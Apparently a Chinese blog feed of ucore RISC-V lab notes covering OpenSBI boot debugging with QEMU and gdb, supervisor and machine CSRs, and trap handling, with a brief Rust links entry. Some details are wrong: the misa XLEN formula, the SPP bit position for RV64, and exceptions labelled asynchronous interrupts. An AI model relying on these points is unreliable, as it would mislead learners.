<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_start:</span><br><span class="line">	/* Find preferred boot HART id */</span><br><span class="line">	MOV_3R	s0, a0, s1, a1, s2, a2</span><br><span class="line">	call	fw_boot_hart</span><br><span class="line">	add	a6, a0, zero</span><br><span class="line">	MOV_3R	a0, s0, a1, s1, a2, s2</span><br><span class="line">	li	a7, -1</span><br><span class="line">	beq	a6, a7, _try_lottery</span><br><span class="line">	/* Jump to relocation wait loop if we are not boot hart */</span><br><span class="line">	bne	a0, a6, _wait_relocate_copy_done</span><br><span class="line">_try_lottery:</span><br><span class="line">	/* Jump to relocation wait loop if we don&#x27;t get relocation lottery */</span><br><span class="line">	lla	a6, _relocate_lottery</span><br><span class="line">	li	a7, 1</span><br><span class="line">	amoadd.w a6, a7, (a6)</span><br><span class="line">	bnez	a6, _wait_relocate_copy_done</span><br><span class="line"></span><br><span class="line">	/* Save load address */</span><br><span class="line">	lla	t0, _load_start</span><br><span class="line">	lla	t1, _fw_start</span><br><span class="line">	REG_S	t1, 0(t0)</span><br></pre></td></tr></table></figure>



<h2 id="调试-研究os装载例程"><a href="#调试-研究os装载例程" class="headerlink" title="调试(研究os装载例程)"></a>调试(研究os装载例程)</h2><blockquote>
<p>有了上述基础那么就可以开始调试环节了，利用make qemu来编译源代码，make gdb来调试，将makefile中的make qemu更改一下不然会有问题（至少我的有….）</p>
</blockquote>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">......................</span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: qemu </span></span><br><span class="line"><span class="section">qemu: <span class="variable">$(UCOREIMG)</span> <span class="variable">$(SWAPIMG)</span> <span class="variable">$(SFSIMG)</span></span></span><br><span class="line"><span class="comment">#	$(V)$(QEMU) -kernel $(UCOREIMG) -nographic</span></span><br><span class="line">	<span class="variable">$(V)</span><span class="variable">$(QEMU)</span> \</span><br><span class="line">		-machine virt \</span><br><span class="line">		-nographic \</span><br><span class="line">		-bios default \</span><br><span class="line">		-S 	\                              <span class="comment">##启动时暂停便于调试</span></span><br><span class="line">		-gdb tcp::12345 \                <span class="comment">## gdb监听端口</span></span><br><span class="line">		-kernel <span class="variable">$(UCOREIMG)</span>                <span class="comment">## 新增</span></span><br><span class="line"><span class="comment">##		-device loader,file=$(UCOREIMG),addr=0x80200000          ## 注释掉此部分</span></span><br><span class="line">.............................</span><br></pre></td></tr></table></figure>

<p>qemu的路径和gdb的一些路径改一下，改成你安装的bin文件中的可执行程序的文件名。gdb我没有安装riscv版本的，直接用的gdb-multiach，可供参考。</p>
<blockquote>
<p>可观察到复位地址以及阻塞地址，和上面讲的都是一样的</p>
</blockquote>
<p><img src="/img/mypic/ucore/%E9%98%BB%E5%A1%9E.png" alt="image-20240831175014062"></p>
<p><img src="/img/mypic/ucore/reset.png" alt="image-20240831175046980"></p>
<h3 id="opensbi"><a href="#opensbi" class="headerlink" title="opensbi"></a>opensbi</h3><blockquote>
<p>将断点打到0x80000000，然后continue，观察一下opensbi的指令看看是否和先前分析的一样。</p>
</blockquote>
<p><img src="/img/mypic/ucore/opensbi.png" alt="image-20240831175528255"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_start:</span><br><span class="line">	/* Find preferred boot HART id */</span><br><span class="line">	MOV_3R	s0, a0, s1, a1, s2, a2</span><br><span class="line">	call	fw_boot_hart</span><br><span class="line">	add	a6, a0, zero</span><br><span class="line">	MOV_3R	a0, s0, a1, s1, a2, s2</span><br><span class="line">	li	a7, -1</span><br><span class="line">	beq	a6, a7, _try_lottery</span><br><span class="line">	/* Jump to relocation wait loop if we are not boot hart */</span><br><span class="line">	bne	a0, a6, _wait_relocate_copy_done</span><br></pre></td></tr></table></figure>

<p>tql，确实是一样的，之前分析的没有一点问题。具体函数功能就不做分析了，整个opensbi估计够我学好长时间了，以后有机会的话再学习吧。</p>
<h3 id="os加载"><a href="#os加载" class="headerlink" title="os加载"></a>os加载</h3><blockquote>
<p>opensbi就是实现see为os提供sbi的接口，因此opensbi是运作在m态之上的。接下来解释os的加载了，os的入口点也是在链接控制脚本中指定，这是本实验的连接控制脚本所指定的入口点，至于段合并之类的就不展示了，本质就是手动控制一些program segment的合并，精确控制每一个segment的基址，毕竟os之前没有加载器之类的东西，默认链接脚本生成的可执行文件现在的机器是不认识的。接下来就是找入口点地址，利用p指令可以打印出来，这里面还有一个坑，就是此内核的默认make是去掉符号表的，因此手动改一下吧：手动搜索strip，把这个删掉就可以了，gdb也要执行file bin&#x2F;kernel才行，不知道为什么。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* Simple linker script for the ucore kernel.</span><br><span class="line">   See the GNU ld &#x27;info&#x27; manual (&quot;info ld&quot;) to learn the syntax. */</span><br><span class="line"></span><br><span class="line">OUTPUT_ARCH(riscv)</span><br><span class="line">ENTRY(kern_entry)</span><br><span class="line">...............</span><br></pre></td></tr></table></figure>

<p><img src="/img/mypic/ucore/%E5%85%A5%E5%8F%A3%E7%82%B9.png" alt="image-20240831181055849"></p>
<p>可以看见入口点就做两件事，调整sp到bootstacktop并加载正真的kernel的初始函数。</p>
<p><img src="/img/mypic/ucore/image-20240831181457737.png" alt="image-20240831181457737"></p>
<h3 id="os运行"><a href="#os运行" class="headerlink" title="os运行"></a>os运行</h3><blockquote>
<p>继续打断点，然后运行，这就是我们实验上写的内核的初始函数喽，调用sbi接口进行打印，然后坠入死循环（最后一条指令），因此qemu就直接变砖了哈哈哈，只能强制关闭shell才行，终端都相应不了了，这也许就是下一次实验实现中断的原因吧。</p>
</blockquote>
<p><img src="/img/mypic/ucore/runstart.png" alt="image-20240831182044836"></p>
<blockquote>
<p>可以观察一下qemu的执行结果，会打印出咱们想要的</p>
</blockquote>
<p><img src="/img/mypic/com/image-20240831182427141.png" alt="image-20240831182427141"></p>
<blockquote>
<p>可以看出程序已经跟死了没啥差别了。。。。</p>
</blockquote>
<p><img src="/img/mypic/ucore/die.png" alt="image-20240831182501902"></p>
<h2 id="中断功能加入"><a href="#中断功能加入" class="headerlink" title="中断功能加入"></a>中断功能加入</h2><blockquote>
<p>在做此实验之前需要一些前置知识</p>
</blockquote>
<h3 id="特权指令"><a href="#特权指令" class="headerlink" title="特权指令"></a>特权指令</h3><p>SYSTEM操作码在RISC-V指令集中承担着编码所有特权指令的角色。特权指令是那些只能由具有特权的处理器模式（例如内核模式）执行的指令。这些指令分为两大类：</p>
<ol>
<li><strong>原子性读-修改-写CSRs的指令</strong>：这些指令是对控制和状态寄存器（CSRs）进行操作的指令。CSRs是RISC-V处理器中的特殊寄存器，用于存储与处理器的控制和状态相关的信息，例如中断处理、异常状态、性能计数器等。原子性意味着这些指令可以确保在进行读取、修改和写入操作时，不会被其他指令打断，从而保证操作的完整性。</li>
<li><strong>其他特权指令</strong>：除了操作CSRs的指令，其他特权指令还包括许多与处理器的特权模式相关的操作，例如切换处理器模式、管理虚拟内存、处理异常和中断等。这些指令通常和处理器的管理功能紧密相关。</li>
</ol>
<h3 id="CSRs"><a href="#CSRs" class="headerlink" title="CSRs"></a>CSRs</h3><p>RISC-V为CSR预留了一个12位的地址空间，即每个CSR的地址由12位组成。这12位地址中的高4位（csr[11:8]）用于定义CSR的访问权限：</p>
<ol>
<li>**csr[11:10]**：这两位用于指示该CSR是可读写还是只读。不同的组合表示不同的读写权限：<ul>
<li><code>00</code>、<code>01</code>、<code>10</code> 表示该CSR是可读写的。</li>
<li><code>11</code> 表示该CSR是只读的。</li>
</ul>
</li>
<li>**csr[9:8]**：这两位用于定义最低能够访问该CSR的特权级别。RISC-V有多个特权级别，如用户模式、监督模式和机器模式，csr[9:8]的值决定了哪一个特权级别的代码可以访问这个寄存器。</li>
</ol>
<p><img src="/img/mypic/ucore/csrs.png" alt="image-20240831214926417"></p>
<h3 id="CSR字段规范（filed-specification）"><a href="#CSR字段规范（filed-specification）" class="headerlink" title="CSR字段规范（filed specification）"></a>CSR字段规范（filed specification）</h3><p><strong>WIRI（保留写入忽略，读取忽略值）</strong>：</p>
<ul>
<li>这些字段是保留供将来使用的。写入这些字段时，硬件会忽略写入的值，读取时返回的值无意义。此标签主要用于那些在当前没有明确用途的CSR字段，以避免未来使用中的冲突。</li>
</ul>
<p><strong>WPRI（保留写入保留值，读取忽略值）</strong>：</p>
<ul>
<li>当你写入一个寄存器时，如果该寄存器包含WPRI字段，硬件会保留这些字段的现有值，而忽略你试图写入的新值。这确保了当将来这些字段有实际用途时，它们的值不会因先前的操作而被破坏。</li>
</ul>
<p><strong>WRL（写入&#x2F;读取仅合法值）</strong>：</p>
<ul>
<li>对这些字段的写入和读取仅支持特定的合法值。如果你写入一个不合法的值，硬件可能不会引发异常，但读取的结果可能是未定义的。通常，硬件会返回最后一个合法值，或根据某些硬件状态位返回其他值。</li>
</ul>
<p><strong>WARL（写入任意值，读取合法值）</strong>：</p>
<ul>
<li>这些字段允许你写入任何值，但硬件会自动确保读取时返回合法的值。这个机制使得即使软件写入了非标准值，硬件也能保证系统的稳定性和一致性。</li>
</ul>
<h3 id="Supervisor-Level-ISA"><a href="#Supervisor-Level-ISA" class="headerlink" title="Supervisor-Level ISA"></a>Supervisor-Level ISA</h3><blockquote>
<p>因为是操作系统实验，故跳过了m态的部分，其依赖于硬件提供的sbi接口</p>
</blockquote>
<h4 id="Supervisor-Status-Register-sstatus"><a href="#Supervisor-Status-Register-sstatus" class="headerlink" title="Supervisor Status Register (sstatus)"></a>Supervisor Status Register (sstatus)</h4><p><img src="/img/mypic/ucore/sstatus.png" alt="image-20240831215741967"><strong>SPP（Supervisor Previous Privilege)</strong>:</p>
<ul>
<li><p><strong>位置</strong>: 在 RV32 中位于第 8 位，在 RV64 和 RV128 中位于第 20 位。</p>
</li>
<li><p>功能</p>
<p>: 该位用于指示陷入监督模式之前处理器的特权级别。</p>
<ul>
<li>如果陷入（trap）之前处理器是在用户模式（User Mode）下运行，则该位为0。</li>
<li>如果是在监督模式（Supervisor Mode）下运行，则该位为1。</li>
</ul>
</li>
<li><p><strong>使用场景</strong>: 当使用 <code>SRET</code> 指令从陷阱（trap）返回时，处理器会根据该位决定返回到用户模式或监督模式。</p>
</li>
</ul>
<p><strong>SIE（Supervisor Interrupt Enable）</strong>:</p>
<ul>
<li><p><strong>位置</strong>: 在 RV32 中位于第 1 位，在 RV64 和 RV128 中位于第 1 位。</p>
</li>
<li><p>功能</p>
<p>: 该位控制监督模式下的全局中断使能。</p>
<ul>
<li>当 SIE 为 1 时，监督模式中断被使能。</li>
<li>当 SIE 为 0 时，所有监督模式下的中断被禁用。</li>
</ul>
</li>
<li><p><strong>使用场景</strong>: 在处理器需要临时屏蔽中断时，OS 可以清除 SIE 位，以确保中断不会打断关键的代码执行。</p>
</li>
</ul>
<p><strong>SPIE（Supervisor Previous Interrupt Enable）</strong>:</p>
<ul>
<li><p><strong>位置</strong>: 在 RV32 中位于第 5 位，在 RV64 和 RV128 中位于第 5 位。</p>
</li>
<li><p>功能</p>
<p>: 该位保存了陷入监督模式前 SIE 位的值。</p>
<ul>
<li>当陷阱发生时，SIE 位的值会被保存到 SPIE 中，并且 SIE 位被清除（禁用中断）。</li>
<li>当执行 <code>SRET</code> 指令返回时，SIE 位将被恢复为 SPIE 的值。</li>
</ul>
</li>
<li><p><strong>使用场景</strong>: 这确保了中断状态在陷入和返回过程中的一致性。</p>
</li>
</ul>
<p><strong>UPIE（User Previous Interrupt Enable）</strong>:</p>
<ul>
<li><p><strong>位置</strong>: 在 RV32 中位于第 4 位，在 RV64 和 RV128 中位于第 4 位。</p>
</li>
<li><p>功能</p>
<p>: 该位保存了陷入用户模式前的用户模式中断使能状态。</p>
<ul>
<li>类似于 SPIE，当处理器从用户模式陷入监督模式时，UPIE 保存用户模式的中断使能状态。</li>
<li>当 <code>URET</code> 指令被执行时，UIE 位会被恢复为 UPIE 的值。</li>
</ul>
</li>
<li><p><strong>使用场景</strong>: 用于管理用户模式的中断状态，确保当用户模式任务恢复执行时，其中断状态与陷入前一致。</p>
</li>
</ul>
<p><strong>UIE（User Interrupt Enable）</strong>:</p>
<ul>
<li><p><strong>位置</strong>: 在 RV32 中位于第 0 位，在 RV64 和 RV128 中位于第 0 位。</p>
</li>
<li><p>功能</p>
<p>: 该位控制用户模式下的全局中断使能。</p>
<ul>
<li>当 UIE 为 1 时，用户模式中断被使能。</li>
<li>当 UIE 为 0 时，用户模式中断被禁用。</li>
</ul>
</li>
<li><p><strong>使用场景</strong>: 在用户模式任务需要屏蔽中断时，OS 可以操作 UIE 位。</p>
</li>
</ul>
<h4 id="Supervisor-Trap-Vector-Base-Address-Register-stvec"><a href="#Supervisor-Trap-Vector-Base-Address-Register-stvec" class="headerlink" title="Supervisor Trap Vector Base Address Register (stvec)"></a>Supervisor Trap Vector Base Address Register (stvec)</h4><p><img src="/img/mypic/ucore/image-20240831221145005.png" alt="image-20240831221145005"></p>
<blockquote>
<p>关于mode</p>
</blockquote>
<p><img src="/img/mypic/ucore/image-20240831221210957.png" alt="image-20240831221210957"></p>
<h4 id="Supervisor-Interrupt-Registers-sip-and-sie"><a href="#Supervisor-Interrupt-Registers-sip-and-sie" class="headerlink" title="Supervisor Interrupt Registers (sip and sie)"></a>Supervisor Interrupt Registers (sip and sie)</h4><blockquote>
<p>分别代表着中断挂起（pending）和中断使能（enable）是对每种类型中断的精确控制，主要分为这三种：software interrupts, timer interrupts, and external interrupts，软件中断又分为u型和s型</p>
</blockquote>
<h4 id="Supervisor-Timers-and-Performance-Counters"><a href="#Supervisor-Timers-and-Performance-Counters" class="headerlink" title="Supervisor Timers and Performance Counters"></a>Supervisor Timers and Performance Counters</h4><blockquote>
<p><code>scounteren</code> 是一个用于控制用户模式（U-mode）下硬件性能监控计数器（Hardware Performance Monitoring Counters）可用性的寄存器。通过设置或清除 <code>scounteren</code> 寄存器中的各个位，监督模式（S-mode）可以控制用户模式下对特定计数器的访问权限。</p>
</blockquote>
<h4 id="Supervisor-Scratch-Register-sscratch"><a href="#Supervisor-Scratch-Register-sscratch" class="headerlink" title="Supervisor Scratch Register (sscratch)"></a>Supervisor Scratch Register (sscratch)</h4><p><code>sscratch</code> 寄存器是一个 XLEN 位的读&#x2F;写寄存器，专门供监督模式（Supervisor Mode）使用。这个寄存器通常用来保存当前硬件线程（hart）在执行用户代码时监督模式的上下文指针。</p>
<h4 id="典型用途"><a href="#典型用途" class="headerlink" title="典型用途"></a>典型用途</h4><ul>
<li><strong>存储指针</strong>：<code>sscratch</code> 寄存器通常用于存储一个指向 hart 本地监督模式上下文的指针。当处理器在用户模式下运行时，<code>sscratch</code> 中会保存与监督模式相关的关键信息，比如栈指针或数据结构的地址。</li>
<li><strong>陷阱处理程序初始化</strong>：在发生陷阱（trap）时，处理器会切换到监督模式，<code>sscratch</code> 寄存器的内容可以与某个用户寄存器的内容交换。这种交换机制允许陷阱处理程序快速获得一个可用的工作寄存器，以便开始处理陷阱。例如，陷阱处理程序可以将 <code>sscratch</code> 的值加载到一个通用寄存器中，以便使用监督模式的栈指针。</li>
</ul>
<h4 id="Supervisor-Exception-Program-Counter-sepc"><a href="#Supervisor-Exception-Program-Counter-sepc" class="headerlink" title="Supervisor Exception Program Counter (sepc)"></a>Supervisor Exception Program Counter (sepc)</h4><p><code>sepc</code> 是一个 XLEN 位的读&#x2F;写寄存器，用于存储发生异常时的程序计数器（PC）值。这个寄存器在监督模式（S-mode）下使用，通常用于记录导致异常的指令地址，以便在处理完异常后能够恢复程序执行。</p>
<h4 id="寄存器结构"><a href="#寄存器结构" class="headerlink" title="寄存器结构"></a>寄存器结构</h4><ul>
<li><strong>最低位 <code>sepc[0]</code></strong>: 永远为零。这是因为在RISC-V中，指令的对齐要求至少为16位或32位，因此程序计数器的最低一位不可能为1。</li>
<li><strong>最低两位 <code>sepc[1:0]</code></strong>: 对于不支持16位指令对齐的实现，这两位始终为零。这确保了程序计数器指向的是一个有效的指令地址。</li>
</ul>
<h4 id="Supervisor-Cause-Register-scause"><a href="#Supervisor-Cause-Register-scause" class="headerlink" title="Supervisor Cause Register (scause)"></a>Supervisor Cause Register (scause)</h4><blockquote>
<p> 指示引发中断的原因</p>
</blockquote>
<h4 id="Supervisor-Trap-Value-stval-Register"><a href="#Supervisor-Trap-Value-stval-Register" class="headerlink" title="Supervisor Trap Value (stval) Register"></a>Supervisor Trap Value (stval) Register</h4><blockquote>
<p><strong>stval 寄存器</strong> 是一个 XLEN 位的可读写寄存器（XLEN 是架构的字长，如 32 位或 64 位）。当系统进入 S 模式（Supervisor mode）并处理陷阱（异常）时，<code>stval</code> 会被写入与该异常相关的特定信息，以便帮助软件处理该异常。</p>
</blockquote>
<h4 id="Supervisor-Address-Translation-and-Protection-satp-Register"><a href="#Supervisor-Address-Translation-and-Protection-satp-Register" class="headerlink" title="Supervisor Address Translation and Protection (satp) Register"></a>Supervisor Address Translation and Protection (satp) Register</h4><blockquote>
<p>和地址转换相关</p>
</blockquote>
<h2 id="lab相关"><a href="#lab相关" class="headerlink" title="lab相关"></a>lab相关</h2><blockquote>
<p>知道了部分基础就可以进行试验了，实验基本上处理的是操作系统层级的异常和中断。</p>
</blockquote>
<h3 id="1-1初始化"><a href="#1-1初始化" class="headerlink" title="1.1初始化"></a>1.1初始化</h3><blockquote>
<p>这一部分是初始化那些个异常寄存器，让中断以及异常发生时能挑战到相应的入口点。接下来学习此部分代码</p>
<p>代码如下：这里有一个问题，那就是在EBREAK之前并没有设置SIE，为什么还是能触发中断。（得到的答案是SIE只能禁止中断，而不能进制异步中断（异常））。</p>
<p>idt_init(); 用来初始化vector table，也就是设置中断处理的entry，主要改变的是stvec这个寄存器，通过定义在riscv.h中的一个宏来实现。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> write_csr(reg, val) (&#123; \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (__builtin_constant_p(val) &amp;&amp; (unsigned long)(val) &lt; 32) \</span></span><br><span class="line"><span class="meta">    asm volatile (<span class="string">&quot;csrw &quot;</span> #reg <span class="string">&quot;, %0&quot;</span> :: <span class="string">&quot;i&quot;</span>(val)); \</span></span><br><span class="line"><span class="meta">  <span class="keyword">else</span> \</span></span><br><span class="line"><span class="meta">    asm volatile (<span class="string">&quot;csrw &quot;</span> #reg <span class="string">&quot;, %0&quot;</span> :: <span class="string">&quot;r&quot;</span>(val)); &#125;)</span></span><br></pre></td></tr></table></figure>

<p>本实验中需要时钟中断的触发，这需要了解sie这个寄存器，这个寄存器为os开发提供了细粒度的异常控制，具体可以控制需要触发哪个异常。代码：<code>set_csr(sie, MIP_STIP);</code>具体参照：</p>
<p>A supervisor-level timer interrupt is pending if the STIP bit in the sip register is set. Supervisorlevel timer interrupts are disabled when the STIE bit in the sie register is clear. An SBI call to the SEE may be used to clear the pending timer interrupt.</p>
<p>其中interrupt被分为三类，一类为soft，一类为time，一类为extern，为别对应三种细粒度的控制</p>
<p>最后的初始化是异常使能位的初始化，主要涉及到sstatus这个寄存器，这个寄存器控制所有中断是否能触发，若此位为0那么细粒度的控制无效。</p>
<p>总结来说中断的触发需要三个条件，先挂起再使能，也要保证全局的可触发性：</p>
<p>**<code>sip</code>**：相应位为1。</p>
<p>**<code>sie</code>**：相应位为1。</p>
<p><strong><code>sstatus</code> 中的 SIE</strong>：相应位为1；</p>
<p>或者异步中断（异常）（Interrupt为0）可以无条件触发。</p>
</blockquote>
<p><img src="/img/mypic/ucore/wRpoXdLnQzwCvsSgtn1GKtUIlIG44=.png" alt="已上传的图片"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">kern_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    ..................</span><br><span class="line">    idt_init();  <span class="comment">// init interrupt descriptor table</span></span><br><span class="line">    <span class="comment">//void (*invalid_function)() = (void (*)())0x80200003;</span></span><br><span class="line">    <span class="comment">//invalid_function();</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;EBREAK\n&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="comment">// rdtime in mbare mode crashes</span></span><br><span class="line">    clock_init();  <span class="comment">// init clock interrupt</span></span><br><span class="line"></span><br><span class="line">    intr_enable();  <span class="comment">// enable irq interrupt</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-中断逻辑的实现之状态保存与恢复"><a href="#1-2-中断逻辑的实现之状态保存与恢复" class="headerlink" title="1.2 中断逻辑的实现之状态保存与恢复"></a>1.2 中断逻辑的实现之状态保存与恢复</h3><blockquote>
<p>在第一步的时候已经将地址绑定到了alltraps，<code>write_csr(stvec, &amp;__alltraps);</code>，因此异常处理的实际入口在此，此函数使用汇编实现，定义在trapentry.S中，主要逻辑如下：</p>
<p>保存通用寄存器的状态和一些csr寄存器的状态以便于异常处理原因查找和执行流的恢复。大多数csr不用手动改变，涉及到特权模式的切换csr也会自动修改，基本上就是记录一下异常发生的位置以及异常发生的原因，最主要的还是状态的保存与切换，这就得了解sscratch的功能了，具体代码如下：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 1.3 中断逻辑的实现之选择性处理</span><br><span class="line"></span><br><span class="line">&gt; 具体什么中断该用什么代码来处理，此程序设计十分巧妙，具体的逻辑在trap函数中，实现并不复杂，但是巧妙在你如何传递异常信息。传递信息的逻辑为将中断信息保存在栈中，并将栈指针传递给trap函数作为第一个参数。那我以后总不能以栈指针交互吧，这太麻烦了，所以就用c语言定义了结构体,这也是一种汇编和c交互的方法吧，如下：</span><br><span class="line">&gt;</span><br><span class="line">&gt; ```c</span><br><span class="line">&gt; struct trapframe &#123;</span><br><span class="line">&gt;     struct pushregs gpr;</span><br><span class="line">&gt;     uintptr_t status;</span><br><span class="line">&gt;     uintptr_t epc;</span><br><span class="line">&gt;     uintptr_t badvaddr;</span><br><span class="line">&gt;     uintptr_t cause;</span><br><span class="line">&gt; &#125;;</span><br><span class="line">&gt; __alltraps:</span><br><span class="line">&gt;     SAVE_ALL</span><br><span class="line">&gt; </span><br><span class="line">&gt;     move  a0, sp</span><br><span class="line">&gt;     jal trap</span><br><span class="line">&gt;     # sp should be the same as before &quot;jal trap&quot;</span><br><span class="line">&gt; </span><br><span class="line">&gt;     .globl __trapret</span><br><span class="line">&gt; __trapret:</span><br><span class="line">&gt;     RESTORE_ALL</span><br><span class="line">&gt;     # return from supervisor call</span><br><span class="line">&gt;     sret</span><br></pre></td></tr></table></figure>
<blockquote>
<p>那么就可以完美传递中断信息，具体中断处理代码的实现就是简单的了</p>
</blockquote>
<h3 id="1-4-中断处理逻辑实现与检测"><a href="#1-4-中断处理逻辑实现与检测" class="headerlink" title="1.4 中断处理逻辑实现与检测"></a>1.4 中断处理逻辑实现与检测</h3>]]></content>
      <categories>
        <category>ucore</category>
      </categories>
      <tags>
        <tag>ucore</tag>
        <tag>riscv</tag>
      </tags>
  </entry>
  <entry>
    <title>rust初探</title>
    <url>/2024/09/15/rust/rust%E5%AE%8F%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p><a href="https://rustmagazine.github.io/rust_magazine_2021/chapter_1/toc.html">https://rustmagazine.github.io/rust_magazine_2021/chapter_1/toc.html</a></p>
<p><a href="https://zjp-cn.github.io/tlborm/proc-macros/methodical/derive.html">https://zjp-cn.github.io/tlborm/proc-macros/methodical/derive.html</a></p>
]]></content>
      <categories>
        <category>rust</category>
      </categories>
      <tags>
        <tag>rust</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv之中断</title>
    <url>/2024/08/31/ucore%E5%AE%9E%E9%AA%8C/riscv%E4%B9%8Bmachainelevel%20/</url>
    <content><![CDATA[<p>发现想要真正理解内核的权限切换以及中断处理是绕不过这东西的，因此现在开始学习M态的一些知识，也就是一些csr和一些指令，还有一些内存管理的东西。</p>
<p>chatgpt总结：</p>
<h2 id="Machine-level-CSRS"><a href="#Machine-level-CSRS" class="headerlink" title="Machine-level CSRS"></a>Machine-level CSRS</h2><p>这段内容详细描述了 RISC-V 中的 <strong><code>misa</code> CSR（机器级 ISA 寄存器）</strong>，以及它的作用、字段含义和编码方式。以下是详细的翻译与讲解。</p>
<h2 id="3-1-机器级-CSR（Machine-Level-CSRs）"><a href="#3-1-机器级-CSR（Machine-Level-CSRs）" class="headerlink" title="3.1 机器级 CSR（Machine-Level CSRs）"></a>3.1 机器级 CSR（Machine-Level CSRs）</h2><p>除了本节描述的机器级 CSR 外，M 模式的代码可以访问所有较低特权级别的 CSR。</p>
<ul>
<li><strong>解释</strong>：RISC-V 允许 M 模式的代码访问所有其他较低特权级别（S 模式、U 模式）的控制和状态寄存器。</li>
</ul>
<hr>
<h3 id="3-1-1-机器-ISA-寄存器（misa）"><a href="#3-1-1-机器-ISA-寄存器（misa）" class="headerlink" title="3.1.1 机器 ISA 寄存器（misa）"></a>3.1.1 机器 ISA 寄存器（misa）</h3><p><code>misa</code> CSR 是一个 XLEN 位的 <strong>WARL</strong>（Write Any Read Legal）寄存器，报告当前 hart 支持的 ISA（指令集架构）。此寄存器在任何实现中都必须是可读的，但可以返回一个值为零来表示 <code>misa</code> 寄存器尚未实现，这时 CPU 功能可能通过其它非标准机制来确定。</p>
<ul>
<li><strong>解释</strong>：<code>misa</code> 寄存器用于确定处理器所支持的指令集结构。虽然它是可写的，但写入的内容受处理器硬件实现的限制，并不是任意值都有效。若寄存器未实现，则必须通过其他机制了解CPU的具体能力。</li>
</ul>
<hr>
<h4 id="misa-寄存器的结构："><a href="#misa-寄存器的结构：" class="headerlink" title="misa 寄存器的结构："></a>misa 寄存器的结构：</h4><ul>
<li><p><strong>MXL（Machine XLEN）字段</strong>：用来编码当前机器支持的基础整数 ISA 宽度（例如，32 位、64 位或 128 位）。该字段可能是可写的，特别是在实现多个基础 ISA 宽度的处理器上，处理器可以根据 <code>MXL</code> 的设置调整实际的 XLEN。</p>
<ul>
<li><strong>MXL</strong> 的值如下表所示：<ul>
<li><code>1</code> 表示 32 位（RV32）。</li>
<li><code>2</code> 表示 64 位（RV64）。</li>
<li><code>3</code> 表示 128 位（RV128）。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Extensions 字段</strong>：这个字段以字母为单位，表示所支持的标准扩展。例如，<code>A</code> 表示原子操作扩展，<code>F</code> 表示单精度浮点数扩展，<code>D</code> 表示双精度浮点数扩展等。这个字段是 <strong>WARL</strong>，所以如果实现允许，扩展的支持可以修改。默认情况下，重置时 <code>misa</code> 寄存器中的扩展字段应包含最大支持的扩展集合。</p>
</li>
<li><p><strong>解释</strong>：<code>MXL</code> 字段决定处理器的基本指令集宽度（32 位、64 位或 128 位），而 <code>Extensions</code> 字段表示处理器所支持的各种扩展特性。<code>WARL</code> 意味着这些字段在硬件实现允许的情况下是可写的。</p>
</li>
</ul>
<hr>
<h4 id="表-3-1：MXL-字段的编码："><a href="#表-3-1：MXL-字段的编码：" class="headerlink" title="表 3.1：MXL 字段的编码："></a>表 3.1：<code>MXL</code> 字段的编码：</h4><table>
<thead>
<tr>
<th>MXL</th>
<th>XLEN</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>32</td>
</tr>
<tr>
<td>2</td>
<td>64</td>
</tr>
<tr>
<td>3</td>
<td>128</td>
</tr>
</tbody></table>
<ul>
<li><strong>解释</strong>：这张表展示了 <code>MXL</code> 字段的取值与基础 ISA 宽度的对应关系。例如，<code>MXL=2</code> 表示处理器支持 64 位（RV64）整数指令集。</li>
</ul>
<hr>
<h4 id="基础宽度的快速检查："><a href="#基础宽度的快速检查：" class="headerlink" title="基础宽度的快速检查："></a>基础宽度的快速检查：</h4><p>可以通过检查 <code>misa</code> 值的符号位来快速确定基础宽度，并且可能通过一个左移和两个分支实现。这些检查可以在汇编代码中编写，而不必知道机器的寄存器宽度（XLEN）。基础宽度的计算公式为：<code>XLEN = 2^MXL + 4</code>。</p>
<ul>
<li><strong>解释</strong>：在某些场景下，可能需要通过汇编代码在不知寄存器宽度的情况下，检查基础宽度。该公式和描述提供了一种简单的方法来确定当前处理器的指令集宽度。</li>
</ul>
<hr>
<p>当 <code>MXL</code> 设置为小于处理器支持的最大宽度时，所有操作必须忽略超过配置的 XLEN 的寄存器位，并且必须用符号扩展来填充目标寄存器的最宽支持 XLEN。</p>
<ul>
<li><strong>解释</strong>：如果 <code>MXL</code> 字段设置的宽度比处理器最大支持的宽度低（例如设置为 32 位而处理器支持 64 位），操作必须忽略超过设置的宽度的位，同时符号扩展目标寄存器。</li>
</ul>
<hr>
<h3 id="Extensions-字段的描述："><a href="#Extensions-字段的描述：" class="headerlink" title="Extensions 字段的描述："></a>Extensions 字段的描述：</h3><ul>
<li><p><strong>Extensions 字段</strong> 表示处理器支持的标准扩展，用字母表示，每个字母代表一个扩展。</p>
<ul>
<li>例如，<code>A</code> 表示原子操作扩展，<code>C</code> 表示压缩指令扩展，<code>F</code> 表示单精度浮点扩展，<code>M</code> 表示整数乘除扩展等。</li>
<li><code>G</code> 字段表示标准扩展的组合（例如 IMAFD）。</li>
<li><code>U</code> 和 <code>S</code> 位表示是否支持用户模式和管理模式。</li>
<li><code>X</code> 位用于表示是否存在非标准扩展。</li>
</ul>
</li>
